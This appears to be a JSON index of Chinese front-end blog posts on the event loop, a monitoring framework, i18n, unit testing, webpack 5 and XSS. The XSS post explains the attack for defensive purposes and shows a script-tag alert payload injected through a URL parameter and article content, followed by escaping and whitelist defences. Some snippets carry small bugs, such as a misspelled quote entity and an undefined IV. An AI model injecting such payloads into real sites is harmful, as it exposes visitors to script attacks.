虽说ES6已经作为新一代标准发布了，但是各大浏览器对新功能实现支持的还需要一段时间，那么我们怎么知道自己使用的浏览器是否支持ES6的相应功能呢？ 对ES6的支持可以查看https://kangax.github.io/es5-compat-table/es6/ ，在这里可以清晰的了解到不同版本的浏览器对ES6功能的支持情况。随着时间的推移，支持度已经越来越高了，ES6的大部分特性都实现了。","link":"/2017/03/21/%E4%BB%80%E4%B9%88%E6%98%AFES6%EF%BC%9F/"},{"title":"什么是Event loop","text":"众所周知 JS 是门非阻塞单线程语言，因为在最初 JS 就是为了和浏览器交互而诞生的。如果 JS 是门多线程的语言话，我们在多个线程中处理 DOM 就可能会发生问题（一个线程中新加节点，另一个线程中删除节点），当然可以引入读写锁解决这个问题。 JS 在执行的过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 Task（有多种 task） 队列中。一旦执行栈为空，Event Loop 就会从 Task 队列中拿出需要执行的代码并放入执行栈中执行，所以本质上来说 JS 中的异步还是同步行为。 1234567console.log('script start')setTimeout(function() { console.log('setTimeout')}, 0)console.log('script end') 以上代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第二个参数不得小于 4 毫秒，不足会自动增加。所以 setTimeout 还是会在 script end 之后打印。 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为 微任务（microtask） 和 宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task。 12345678910111213141516171819console.log('script start')setTimeout(function() { console.log('setTimeout')}, 0)new Promise(resolve =&gt; { console.log('Promise') resolve()}) .then(function() { console.log('promise1') }) .then(function() { console.log('promise2') })console.log('script end')// script start =&gt; Promise =&gt; script end =&gt; promise1 =&gt; promise2 =&gt; setTimeout 以上代码虽然 setTimeout 写在 Promise 之前，但是因为 Promise 属于微任务而 setTimeout属于宏任务，所以会有以上的打印。 微任务包括 process.nextTick ，promise ，Object.observe ，MutationObserver 宏任务包括 script ， setTimeout ，setInterval ，setImmediate ，I/O ，UI rendering 很多人有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script ，浏览器会先执行一个宏任务，接下来有异步代码的话就先执行微任务。 所以正确的一次 Event loop 顺序是这样的 执行同步代码，这属于宏任务 执行栈为空，查询是否有微任务需要执行 执行所有微任务 必要的话渲染 UI 然后开始下一轮 Event loop，执行宏任务中的异步代码 通过上述的 Event loop 顺序可知，如果宏任务中的异步代码有大量的计算并且需要操作 DOM 的话，为了更快的 界面响应，我们可以把操作 DOM 放入微任务中。 Node 中的 Event loopNode 中的 Event loop 和浏览器中的不相同。 Node 的 Event loop 分为 6 个阶段，它们会按照顺序反复运行 123456789101112131415161718┌───────────────────────┐┌─&gt;│ timers ││ └──────────┬────────────┘│ ┌──────────┴────────────┐│ │ I/O callbacks ││ └──────────┬────────────┘│ ┌──────────┴────────────┐│ │ idle, prepare ││ └──────────┬────────────┘ ┌───────────────┐│ ┌──────────┴────────────┐ │ incoming: ││ │ poll │&lt;──connections─── ││ └──────────┬────────────┘ │ data, etc. ││ ┌──────────┴────────────┐ └───────────────┘│ │ check ││ └──────────┬────────────┘│ ┌──────────┴────────────┐└──┤ close callbacks │ └───────────────────────┘ timertimers 阶段会执行 setTimeout 和 setInterval 一个 timer 指定的时间并不是准确时间，而是在达到这个时间后尽快执行回调，可能会因为系统正在执行别的事务而延迟。 下限的时间有一个范围：[1, 2147483647] ，如果设定的时间不在这个范围，将被设置为 1。 I/OI/O 阶段会执行除了 close 事件，定时器和 setImmediate 的回调 idle, prepareidle, prepare 阶段内部实现 pollpoll 阶段很重要，这一阶段中，系统会做两件事情 执行到点的定时器 执行 poll 队列中的事件 并且当 poll 中没有定时器的情况下，会发现以下两件事情 如果 poll 队列不为空，会遍历回调队列并同步执行，直到队列为空或者系统限制 如果 poll 队列为空，会有两件事发生 如果有 setImmediate 需要执行，poll 阶段会停止并且进入到 check 阶段执行 setImmediate 如果没有 setImmediate 需要执行，会等待回调被加入到队列中并立即执行回调 如果有别的定时器需要被执行，会回到 timer 阶段执行回调。 checkcheck 阶段执行 setImmediate close callbacksclose callbacks 阶段执行 close 事件 并且在 Node 中，有些情况下的定时器执行顺序是随机的 12345678910setTimeout(() =&gt; { console.log('setTimeout')}, 0)setImmediate(() =&gt; { console.log('setImmediate')})// 这里可能会输出 setTimeout，setImmediate// 可能也会相反的输出，这取决于性能// 因为可能进入 event loop 用了不到 1 毫秒，这时候会执行 setImmediate// 否则会执行 setTimeout 当然在这种情况下，执行顺序是相同的 1234567891011121314var fs = require('fs')fs.readFile(__filename, () =&gt; { setTimeout(() =&gt; { console.log('timeout') }, 0) setImmediate(() =&gt; { console.log('immediate') })})// 因为 readFile 的回调在 poll 中执行// 发现有 setImmediate ，所以会立即跳到 check 阶段执行回调// 再去 timer 阶段执行 setTimeout// 所以以上输出一定是 setImmediate，setTimeout 上面介绍的都是 macrotask 的执行情况，microtask 会在以上每个阶段完成后立即执行。 1234567891011121314151617181920setTimeout(() =&gt; { console.log('timer1') Promise.resolve().then(function() { console.log('promise1') })}, 0)setTimeout(() =&gt; { console.log('timer2') Promise.resolve().then(function() { console.log('promise2') })}, 0)// 以上代码在浏览器和 node 中打印情况是不同的// 浏览器中一定打印 timer1, promise1, timer2, promise2// node 中可能打印 timer1, timer2, promise1, promise2// 也可能打印 timer1, promise1, timer2, promise2 Node 中的 process.nextTick 会先于其他 microtask 执行。 123456789101112setTimeout(() =&gt; { console.log('timer1') Promise.resolve().then(function() { console.log('promise1') })}, 0)process.nextTick(() =&gt; { console.log('nextTick')})// nextTick, timer1, promise1","link":"/2021/06/19/%E4%BB%80%E4%B9%88%E6%98%AFEvent-loop/"},{"title":"从零构建前端监控框架：原理与实践","text":"在当今的互联网应用开发中，前端性能和用户体验的重要性不言而喻。为了确保前端应用的高质量运行，前端监控工具成为了开发者的得力助手。本文将深入剖析如何构建一个类似 monitoring-tool 的前端监控框架，包括其实现原理以及详细的构建步骤。 一、前端监控的重要性在复杂的前端应用中，性能问题可能导致页面加载缓慢、用户操作卡顿，严重影响用户体验，进而导致用户流失。据统计，页面加载时间每延长 1 秒，用户流失率可能增加 10% 以上。错误未及时发现和处理可能引发应用崩溃或功能异常，例如未捕获的 JavaScript 错误可能导致整个页面交互失效。通过前端监控，我们可以实时了解应用的运行状态，及时发现并解决问题，提升应用的稳定性和性能，为用户提供更流畅的体验。 二、实现原理1. 数据采集性能指标采集 利用 Performance APIPerformance API 提供了丰富的性能数据，通过 performance.timing 可以精确记录页面加载各阶段的时间。例如，navigationStart 表示浏览器开始卸载当前页面的时间，responseStart 表示浏览器开始接收响应数据的时间，两者的差值可得出服务器响应时间。监听 load 事件可以获取页面完全加载的时间，DOMContentLoaded 事件则表示 DOM 树构建完成的时间，用于确定页面关键加载节点。 计算页面渲染时间通过 performance.getEntriesByType('paint') 获取绘制相关的性能条目，计算首次内容绘制（FCP）、最大内容绘制（LCP）等时间，帮助了解页面从开始渲染到可交互的时长，找出可能影响用户体验的瓶颈。 错误信息采集 JavaScript 错误捕获借助 window.onerror 捕获各类 JavaScript 错误，包括语法错误、运行时错误等，获取错误信息、发生错误的文件路径、行号、列号以及错误堆栈，方便快速定位问题根源。 Promise 错误处理监听 unhandledrejection 事件，确保 Promise 中未处理的错误不会被遗漏，提升错误捕获的全面性。 资源加载错误针对图片或脚本加载失败等资源加载错误，通过监听 img、script 等元素的 error 事件，及时记录错误情况，避免因资源问题影响页面功能。 用户行为采集 交互事件监听广泛监听页面交互事件，如 click、scroll 和 input 等。当用户点击按钮时，记录点击元素的标签名、时间和相关上下文（如元素 ID、类名），深入了解用户操作流程。 滚动事件跟踪跟踪滚动事件，记录用户滚动的位置和时间，分析用户在页面上的浏览深度和行为模式，为优化页面布局和内容提供数据支持。 2. 数据上报 创建上报请求采集到数据后，将其格式化为适合传输的 JSON 格式，然后利用 XMLHttpRequest 或 fetch 创建 POST 请求，将数据发送到指定的后端接口，确保数据准确、及时地传输。 设置上报时机和策略 即时上报：对于关键数据（如错误信息）采用即时上报，确保数据及时送达后端，但可能增加网络请求频率。 定时批量上报：对于性能指标和用户行为数据，可采用定时批量上报，例如每隔 5 秒集中发送一次数据，平衡性能与数据实时性。 网络缓存机制：考虑网络状况，在网络不稳定时，利用 localStorage 或 IndexedDB 缓存数据，待网络恢复后自动重新上报，保证数据不丢失。 3. 数据处理和分析（后端部分） 接收和存储数据后端接口接收前端上报的数据后，存储到数据库中。对于结构化数据可使用 MySQL，对于非结构化数据可使用 MongoDB，为后续分析提供持久化的数据支持。 数据清洗和预处理清理无效或错误的数据（如重复数据、格式错误的数据），确保分析数据的准确性。解析时间格式为统一的时间戳，便于后续计算和比较，同时进行数据统计，如计算性能指标的平均值、最大值和最小值等。 数据分析和可视化通过数据分析工具和算法，深入挖掘性能数据背后的规律。例如，分析不同时间段或页面的性能趋势，找出性能波动的原因。将分析结果以直观的图表形式展示，如柱状图展示不同页面的加载时间对比，折线图呈现性能指标随时间的变化趋势，帮助开发者快速理解和定位问题。 4. 可扩展性设计 插件机制提供插件接口，允许开发者根据项目特定需求扩展监控功能。插件应包含初始化函数和数据处理函数，例如编写插件采集业务相关的自定义数据（如用户购物流程中的关键操作信息），或者对采集到的数据进行个性化处理后再上报。 配置灵活性通过配置文件或初始化参数，让开发者能够轻松调整监控范围（如仅监控关键页面或功能模块）、自定义上报地址（适应不同的后端部署环境）、灵活设置数据采集频率（根据应用的实际情况平衡性能和数据完整性）。 5. 与前端框架集成若针对特定前端框架（如 Vue、React）设计，可将监控功能封装为插件或指令。在 Vue 中，利用生命周期钩子 mounted 和 destroyed 嵌入数据采集逻辑；在 React 中，通过自定义 Hooks 实现。与框架的路由系统紧密结合，实现页面切换时的性能监控和数据上报，提供全面的应用监控解决方案。 6. 安全性考虑 数据加密在数据上报过程中，对敏感信息（如用户身份标识、业务数据等）使用 AES 等加密算法进行加密，防止数据在传输过程中被窃取或篡改，确保数据安全。 权限管理后端接口实施严格的权限验证，采用 JWT 令牌认证，只有经过授权的前端应用才能成功上报数据，防止非法数据注入，保障系统的安全性和稳定性。 三、构建步骤1. 项目初始化创建项目文件夹，使用 npm init 生成 package.json 文件，初始化项目基本信息，如项目名称、版本号和依赖管理等。 2. 依赖安装根据项目需求，安装必要的依赖库。例如，使用 performance-now 获取更精确的时间戳，axios 处理 HTTP 请求，typescript 进行类型安全开发，并安装相应的类型定义文件。 3. 性能指标采集模块封装 Performance API 的使用，创建函数获取页面加载时间、资源加载时间等关键性能指标： 1234function getPageLoadTime() { const { performance } = window; return performance.timing.loadEventEnd - performance.timing.navigationStart;} 监听页面加载事件，在合适时机调用采集函数并存储数据： 123window.addEventListener('load', () =&gt; { const loadTime = getPageLoadTime(); // 存储数据以便后续上报}); 4. 错误信息采集模块实现 window.onerror 事件监听器，捕获 JavaScript 错误并记录详细信息： 12345678910window.onerror = function (message, source, lineno, colno, error) { const errorData = { message, source, lineno, colno, stack: error &amp;&amp; error.stack }; // 处理错误数据，如存储或上报}; 针对 Promise 错误和资源加载错误，分别添加相应的监听器： 1234567window.addEventListener('unhandledrejection', (event) =&gt; { const errorData = { message: event.reason.message, stack: event.reason.stack }; // 处理Promise错误数据}); 5. 用户行为采集模块为常见的用户交互事件添加事件监听器，记录用户行为数据： 12345678910document.addEventListener('click', (event) =&gt; { const behaviorData = { type: 'click', target: event.target.tagName, time: new Date().getTime(), targetId: event.target.id, targetClass: event.target.className }; // 处理行为数据}); 6. 数据上报模块封装数据上报函数，将采集到的数据格式化为 JSON 格式，并使用 fetch 或 axios 发送 POST 请求到后端接口： 1234567891011121314151617async function reportData(data) { try { const response = await fetch('your-backend-api-url', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer YOUR_TOKEN' // 权限验证令牌 }, body: JSON.stringify(data) }); const result = await response.json(); // 处理上报结果 } catch (error) { // 处理上报失败情况，存入缓存 localStorage.setItem('monitoringData', JSON.stringify(data)); }} 7. 后端搭建（简要概述）选择合适的后端技术栈，如 Node.js + Express： 123456789101112131415161718192021222324252627282930const express = require('express');const app = express();const bodyParser = require('body-parser');const jwt = require('jsonwebtoken'); // 用于权限验证// 解析JSON请求体app.use(bodyParser.json());// 权限验证中间件function verifyToken(req, res, next) { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(403).send('No token provided'); jwt.verify(token, process.env.JWT_SECRET, (err, decoded) =&gt; { if (err) return res.status(401).send('Invalid token'); req.user = decoded; next(); });}app.post('/api/report', verifyToken, (req, res) =&gt; { const data = req.body; // 将数据存储到数据库（如MySQL或MongoDB） console.log('Received data:', data); res.send('Data received successfully');});const port = 3000;app.listen(port, () =&gt; { console.log(`Server running on port ${port}`);}); 8. 可扩展性设计定义插件接口，规定插件的结构和功能规范： 12345// 插件接口定义interface MonitorPlugin { init(config: any): void; processData(data: any): any;} 在主监控模块中，提供加载插件的机制： 12345678910class Monitor { plugins: MonitorPlugin[] = []; addPlugin(plugin: MonitorPlugin) { this.plugins.push(plugin); plugin.init(this.config); } processWithPlugins(data: any) { return this.plugins.reduce((acc, plugin) =&gt; plugin.processData(acc), data); }} 9. 安全性增强对于数据加密，使用 AES 算法对敏感数据进行加密处理： 1234567const crypto = require('crypto');function encryptData(data, key) { const cipher = crypto.createCipheriv('aes-256-cbc', key, iv); let encrypted = cipher.update(data, 'utf8', 'hex'); encrypted += cipher.final('hex'); return encrypted;} 10. 测试与优化编写单元测试用例，覆盖各个功能模块，使用 Jest 测试框架： 12345678910111213test('getPageLoadTime should return correct value', () =&gt; { const expectedLoadTime = 1000; // 模拟performance.timing.loadEventEnd和navigationStart Object.defineProperty(window.performance, 'timing', { value: { loadEventEnd: expectedLoadTime + 500, navigationStart: 500 }, writable: true }); const result = getPageLoadTime(); expect(result).toBe(expectedLoadTime);}); 进行性能优化，避免监控代码对应用性能产生过大影响，例如优化数据采集的频率，减少不必要的事件监听和计算。 11. 文档编写撰写详细的文档，包括项目的使用方法、API 文档、配置说明等。例如，说明如何初始化监控实例、配置上报地址、添加自定义插件等，方便其他开发者使用和扩展该监控框架。 通过以上步骤，我们可以逐步构建一个功能完备、可扩展且安全的前端监控框架，为前端应用的性能优化和错误排查提供有力支持。在实际应用中，可根据具体需求进一步定制和完善该框架，以满足不同项目的监控需求。欢迎访问 monitoring-tool 查看更多实现细节和示例代码","link":"/2025/06/03/%E4%BB%8E%E9%9B%B6%E6%9E%84%E5%BB%BA%E5%89%8D%E7%AB%AF%E7%9B%91%E6%8E%A7%E6%A1%86%E6%9E%B6%EF%BC%9A%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"title":"什么是XSS？","text":"什么是XSS呢 跨网站指令码（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是[代码注入]的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了 HTML 以及使用者端脚本语言。 XSS 分为三种：反射型，存储型和 DOM-based 如何攻击XSS 通过修改 HTML 节点或者执行 JS 代码来攻击网站。 例如通过 URL 获取某些参数 12&lt;!-- http://www.domain.com?name=&lt;script&gt;alert(1)&lt;/script&gt; --&gt;&lt;div&gt;{{name}}&lt;/div&gt; 上述 URL 输入可能会将 HTML 改为 &lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt; ，这样页面中就凭空多了一段可执行脚本。这种攻击类型是反射型攻击，也可以说是 DOM-based 攻击。 也有另一种场景，比如写了一篇包含攻击代码 &lt;script&gt;alert(1)&lt;/script&gt; 的文章，那么可能浏览文章的用户都会被攻击到。这种攻击类型是存储型攻击，也可以说是 DOM-based 攻击，并且这种攻击打击面更广。 如何防御最普遍的做法是转义输入输出的内容，对于引号，尖括号，斜杠进行转义 12345678910function escape(str) { str = str.replace(/&amp;/g, '&amp;amp;') str = str.replace(/&lt;/g, '&amp;lt;') str = str.replace(/&gt;/g, '&amp;gt;') str = str.replace(/&quot;/g, '&amp;quto;') str = str.replace(/'/g, '&amp;#39;') str = str.replace(/`/g, '&amp;#96;') str = str.replace(/\\//g, '&amp;#x2F;') return str} 通过转义可以将攻击代码 &lt;script&gt;alert(1)&lt;/script&gt; 变成 12// -&gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;&amp;#x2F;script&amp;gt;escape('&lt;script&gt;alert(1)&lt;/script&gt;') 对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。这种情况通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。 1234var xss = require('xss')var html = xss('&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;')// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert(&quot;xss&quot;);&amp;lt;/script&amp;gt;console.log(html) 以上示例使用了 js-xss 来实现。可以看到在输出中保留了 h1 标签且过滤了 script 标签","link":"/2021/07/11/%E4%BB%80%E4%B9%88%E6%98%AFXSS%EF%BC%9F/"},{"title":"前端国际化全流程解决方案","text":"背景进入项目组，接到的需求是vue框架的项目实现国际化，实现中英文版本的切换。目前常用的前端国际化实现方式是使用配置文件的方式，使用的是同一套界面，根据语言的不同加载对应的配置文件。 而实现这一功能，面对的问题是需要将项目中的中文抽离出中文的语言包，并将其翻译输出英文语言包，以及项目中中文替换成语言包中的变量，工作量大且容易出错。因此，我们需要一种更智能、更高效的解决方案来应对这一挑战，经过深入研究各种技术方案，是不是可以通过插件实现自动识别代码中的可翻译字符串、生成翻译文件并同步不同语言这一繁琐的过程呢 – 于是一个搞定项目国际化的插件就此诞生。 方案选择常用项目使用的技术栈相匹配的国际化的插件工具： vue 使用插件：vue-i18n angular使用插件：angular-translate react使用插件：react-intl jquery 使用插件： jquery.i18n.property 这些插件的解决方案都是基于多个国家配置不同的语言文案,将所有的语言资源放在独立的文件夹下，以每个字段唯一标识（通过对应key动态渲染），去找到不同语言相对应的字段，以显示来完成前端国际化。 这样在html我们只需要输出标识符，在js中配置好功能、路径，我们就可以让它自行去语言资源包中找到对应语言字段以显示。 由于是vue框架的项目，所以插件也是基于vue+vue-i18n的基础下进行设计和开发的。 实现过程为了简化国际化过程，我们开发了一个一键式解决方案插件。该插件可以自动识别代码中的可翻译字符串，生成对应的翻译文件，并实现不同语言之间的同步。webpack-in-loader：该Loader通过集成到构建流程，实现了以下功能： 自动识别 ：深潜Vue、JavaScript、TypeScript及其衍生(JSX,TSX)等源码海洋，精准捕捉每一处待译字符串，无遗漏，高效率。 翻译文件生成 ：基于识别到的字符串自动生成或更新语言资源文件，如使用MD5码作为键值，确保唯一性。 同步不同语言 ：支持自动翻译（通过集成翻译API如百度翻译）和手动翻译，确保翻译内容与源语言的同步更新。 集成便利性 ：作为Webpack构建流程中的隐形助手，只需简单配置，无需触动原始代码，即可轻松开启国际化旅程。开发者坐享其成，国际化部署，一触即发。 实现步骤1.安装与配置：通过npm或yarn安装webpack-in-loader，并按照说明配置Loader规则，指定语言文件路径。 123npm i webpack-in-loader --save-devyarn add webpack-in-loader --dev 2.中文字符串提取：使用CLI命令npx i18n generate从源代码中提取中文字符串并生成初始的zh.js资源文件。 123npx i18n generate [src]#对src目录下的vue/js/ts/tsx/jsx文件进行中文提取并生成国际化资源文件#默认src目录 src 默认值为src 3.翻译管理：通过npx i18n init初始化翻译配置，选择翻译模式（如百度翻译或ChatGPT），并配置相应的API密钥。执行npx i18n translate启动翻译流程。 12345npx i18n init #初始化翻译配置项（如已有配置项，不要重复执行，不然会覆盖）npx i18n translate#开始翻译文件 初始化项目，生成的配置文件 i18n-config.json 1234567891011module.exports = { dir: &quot;./src/locale/&quot;, // 目标目录 file: 'zh.js', // 翻译的文件 distLangs: ['en'], // 要翻译的语言，必须为百度翻译文档上的code值 open: true, // leader是否启用 默认true mode:'Baidu', //翻译方式: 1.Baidu:百度翻译 2:chatGPT:openai翻译 appId:'', // 百度翻译appid secret:'', // 百度翻译密钥 openAiKey: '', // chatGPT key singleNum: 3000, //百度翻译单次请求最长次数 可配置范围（3900 - 600）不填则为默认值 1500（百度账号不同等级最长次数不同）}; 4.人工校验与调整：提供命令npx i18n transform以手动校正翻译错误，确保翻译质量。5.国际化配置整合：在Vue项目中正确配置Vue-i18n，确保语言包能够被正确载入，并在应用启动时生效。 注：目前，该插件稳定版已经在公司的研发协同平台中接入，得到各部门同事的认可，可放心使用。 优势与亮点 自动化程度高：显著减少手动编写与维护语言包的工作量，提高开发效率。 灵活性强：支持自动与手动翻译模式，适应不同场景需求。 易于集成：作为Webpack Loader无缝融入现有构建流程，降低技术门槛。 质量可控：结合自动翻译与人工校对，保证翻译质量。 结语通过使用该一键式国际化解决方案插件，我们大大简化了项目的国际化过程，提高了开发效率和代码质量。开发人员可以更专注于业务逻辑的实现，而无需花费大量时间和精力在翻译和替换上。这一智能化的国际化方案为多语言版本的开发提供了便利，也为项目的国际化需求提供了更好的解决方案。朋友们，如果您觉得这款插件对您有帮助，欢迎访问我的 GitHub 项目页:https://github.com/hujinbin/webpack-i18n-loader您可以在该地址找到插件的详细文档、使用示例以及源代码。我会持续追加新特性和改进已有功能，让插件变得更加优质。 不知是否有兴趣帮我们点个 Star 支持一下呢？","link":"/2024/06/11/%E5%89%8D%E7%AB%AF%E5%9B%BD%E9%99%85%E5%8C%96%E5%85%A8%E6%B5%81%E7%A8%8B%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"title":"如何做组件库的单元测试","text":"前言在我们开发完一个组件库的后，在做单元测试时，代码覆盖率常常被拿来作为衡量测试好坏的指标，甚至，用代码覆盖率来考核测试任务完成情况，比如，代码覆盖率必须达到80％或 90％。于是乎，测试人员费尽心思设计案例覆盖代码。用代码覆盖率来衡量，有利也有有弊。 首先，让我们先来了解一下所谓的“代码覆盖率”。我找来了所谓的定义： 代码覆盖率 ＝ 代码的覆盖程度，一种度量方式。 关于如何开发组件库，可看这篇： 如何基于vue开发ui组件库（heaven-ui） 单元测试英文叫 Unit Testing，又称为模块测试，是针对程序模块来进行正确性检验的测试工作。程序单元是应用的最小可测试部件。在过程化编程中，一个单元就是单个程序、函数、过程等；对于面向对象编程，最小单元就是方法，包括基类（超类）、抽象类、或者派生类（子类）中的方法。 需要注意以下几种情况： 需要访问数据库的测试不叫单元测试； 需要访问网络的测试不叫单元测试； 需要访问文件系统的测试不叫单元测试。 虽然编写单元测试的过程很繁琐，但不得不说，它对于我们的组件的迭代有很大的帮助。 比如写单元测试的时候，经常会发生输出结果不符合你预期的结果，这时你就得重新审视你的代码了。 组件库中每一个组件都可能会重构或者更新迭代，如果单元测试覆盖率高的话，修改代码之后就越可能会发现潜在的问题。比如某些功能代码不小心删掉了。这样会导致用户更新最新版本时，缺少了之前使用过的功能，产生一些疑惑。 技术选型单元测试用到的工具大致分为三部分：分别为管理工具、测试框架、断言库。 测试框架市面上有很多种，常用的测试框架有以下几种： Jasmine：Behavior-Drive development(BDD)风格的测试框架，在业内较为流行,功能很全面，自带 asssert、mock 功能 Qunit：该框架诞生之初是为了 jquery 的单元测试，后来独立出来不再依赖于 jquery 本身，但是其身上还是脱离不开 jquery 的影子 Mocha：Mocha 是一个功能丰富的前端测试框架。所谓”测试框架”，就是运行测试的工具。通过它，可以为 JavaScript 应用添加测试用例，从而保证代码的质量。Mocha 既可以基于 Node.js 环境运行也可以在浏览器环境运行。 Jest：来自于 facebook 出品的通用测试框架，Jest 是一个令人愉快的 JavaScript 测试框架，专注于简洁明快。他适用但不局限于使用以下技术的项目：Babel, TypeScript, Node, React, Angular, Vue 这里 我选用的是Karma、Mocha 和 Chai，接下来简单介绍一下我使用的（Karma）管理工具和（Chai）断言库 Karma 是一个基于 Node.js 的 JavaScript 测试执行过程管理工具，又称 Test Runner。常用的管理工具还有 Jest 等。 Chai 是一个断言库，类似于 Node 的内置断言。通过提供许多可以针对代码运行的断言，它使测试变得更加容易。 Karma 是一个基于 Node.js 的 JavaScript 测试执行过程管理工具，又称 Test Runner。常用的管理工具还有 Jest 等。 Chai 是一个断言库，类似于 Node 的内置断言。通过提供许多可以针对代码运行的断言，它使测试变得更加容易。 编写测试用例组件库开发调试完成后，我们需要编写每个组件对应的单元测试，以达到100%的覆盖率为⽬标。 我在组件库中选择的是karma,目录结构如下： spec目录就是对应组件的单元测试用例了 以button为例： test/specs/Button.spec.js 1234567891011121314import Vue from 'vue'import Button from '@/components/button'describe('button.vue', () =&gt; { it('button是否存在',()=&gt;{ expect(Button).to.be.ok; }) it('测试name是否生效', () =&gt; { const Constructor = Vue.extend(Button) const vm = new Constructor().$mount() expect(vm.$el.querySelector('.hello h1').textContent) .to.equal('Welcome to Your Vue.js App') })}) 执行上述的单元测试代码，就能证明这段代码的行为输出的结果，是否和我们期望的一致。 为什么要做单元测试为达到100%的覆盖率，我们必须尽快能的覆盖所有场景。不得不说，编写测试用例比较繁琐，但我们又为什么要做这繁琐的工作呢？ 因为单元测试包含以下优点： 可能会测出功能的隐藏bug 保证代码重构的安全性。 组件库中每⼀个组件都可能会重构或者更新迭代，如果单元测试覆盖率⾼的话，修改代码之后就越可能会发现潜在的问题。⽐如版本升级后，导致某部分功能的缺失。 自动检测，可以做到一次编写，多次运行，节省重复测试的时间 所以对于现在的组件库项目项目，能够被后续的开发者理解并且参照着继续维护下去，那么单元测试是非常必要的。","link":"/2022/04/26/%E5%A6%82%E4%BD%95%E5%81%9A%E7%BB%84%E4%BB%B6%E5%BA%93%E7%9A%84%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"title":"升级webpack 5实战","text":"升级webpack 5实战 一、背景本次对公司项目进行webpack的升级 ， 原有版本是webpack4.42.1， 本次升级目标是webpack5.28.0，已经是很新的版本了。目标，升级Webpack5，应用长效缓存，提升构建速度。 二、步骤按照官网升级文档 “vue-loader”: “^15.9.6”, “terser-webpack-plugin”: “^5.1.1”, “style-loader”: “^2.0.0”, “mini-css-extract-plugin”: “^1.4.0”, “less-loader”: “^8.0.0”, “html-webpack-plugin”: “^5.3.1”, “file-loader”: “^6.2.0”, “css-loader”: “^5.2.0”, “compression-webpack-plugin”: “^7.1.2”, “babel-loader”: “^8.2.2”, “postcss-loader”: “^5.2.0”, 原有运行命令 “dev”: “webpack-dev-server –inline –progress –config build/webpack.dev.conf.js”, wbepack4X版本使用webpack-dev-server，启动方式为：webpack-dev-server。 webpack5X修改为：webpack server webpack、webpack-cli、webpack-dev-server是需要版本匹配的 原有匹配版本 “webpack”: “^4.42.1”, “webpack-cli”: “^3.3.11”, “webpack-dev-server”: “^3.10.3”, 升级版本 “webpack”: “^5.28.0”, “webpack-cli”: “^4.6.0”, “webpack-dev-server”: “^3.11.2”, 运行报错：webpack.NamedModulesPlugin is not a constructor 原有配置文件 plugins: [ new webpack.NamedModulesPlugin(), ], 改成用配置的方式即可 optimization: { namedModules: true }, 查看文档发布 optimization.namedModules removed (NamedModulesPlugin too) 已经被移除了。 同时在 webpack4 上是默认设置，所以不需要设置这个选项即可。 webpack.HashedModuleIdsPlugin is not a constructor 报错去除 不兼容 报错弃用 new webpack.NamedModulesPlugin() 不兼容 报错弃用 new TerserPlugin(), new HtmlWebpackPlugin({ chunksSortMode: ‘dependency’ }), 报错，新版只支持 ‘none’ | ‘auto’ | ‘manual’ 改为 new HtmlWebpackPlugin({ chunksSortMode: ‘manual’ }), webpack5已内置 TerserPlugin去除 devServer去除了很多旧的配置项目 实际上出错信息已经说明了问题原因： Invalid configuration object. Object has been initialized using a configuration object that does not match the API schema. 这一段的意思是webpack.config.js错误，原因是这个配置文件的版本和我们当前安装的webpack的版本不匹配。 - configuration has an unknown property ‘disableHostCheck’. 然后逐步排查，去掉当前安装的webpack版本已经去掉的配置项目。 mode: process.env.NODE_ENV || ‘production’, 必须配置mode webpack5移除了node环境的polyfill 需要配置fallback resolve: { fallback: { crypto: false } }, configuration.node不兼容 去除了node属性 node: {} 增加属性 optimization: { chunkIds: “deterministic”, moduleIds: “deterministic”, mangleExports: “deterministic” }, target: [‘web’, ‘es5’], // 5特有的文件监听 watchOptions: { //默认为空，不监听的⽂件或者⽬录，⽀持正则 ignored: /node_modules/, //监听到⽂件变化后，等300ms再去执⾏，默认300ms, aggregateTimeout: 300, poll: config.dev.poll, }, // 5新增性能优化 performance: { maxEntrypointSize: 4000000, // 入口起点的最大体积，控制 webpack 何时生成性能提示 maxAssetSize: 1000000, //单个资源体积(单位: bytes)，控制 webpack 何时生成性能提示 }, file-loader和url-loader删除 url-loader弃用， 使用 asset modules 代替 资源模块类型(asset module type)，通过添加 4 种新的模块类型，来替换所有这些 loader： asset/resource 发送一个单独的文件并导出 URL。之前通过使用 file-loader 实现。 asset/inline 导出一个资源的 data URI。之前通过使用 url-loader 实现。 asset/source 导出资源的源代码。之前通过使用 raw-loader 实现。 asset 在导出一个 data URI 和发送一个单独的文件之间自动选择。之前通过使用 url-loader，并且配置资源体积限制实现。 在项目中url-loader改用 type: ‘asset/resource’的形式 当 webpack 配置中使用了 [hash] 占位符时，请考虑将它改为 [contenthash]。效果一致，但事实证明会更为有效。 三、总结本次升级已经完成，在性能上，Webpack5除了未修改重编译，其他上表现并不如之前V4的性能好。在未来的工作上，我会继续关注这里性能为什么不如V4。 下面的脚手架是基于@vue/cli 4.5.8 版本构建，已将webpack3.6.0升级到5.28.0，可以直接下载使用。 github地址 